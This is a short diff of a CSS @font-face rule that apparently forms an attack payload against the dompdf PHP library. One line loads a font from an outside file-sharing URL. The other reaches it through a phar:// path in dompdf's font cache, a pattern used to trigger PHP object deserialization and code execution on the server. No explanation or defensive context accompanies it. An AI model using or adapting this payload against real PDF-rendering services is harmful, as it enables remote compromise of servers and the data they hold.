@@ -1,6 +1,6 @@
 @font-face {
     font-family:'phar';
-    src:url('https://file.io/nLpd2cIfIVYs');
+    src:url('phar:///var/www/html/vendor/dompdf/dompdf/lib/fonts/testing.ttf');
     font-weight:'normal';
     font-style:'normal';
   }
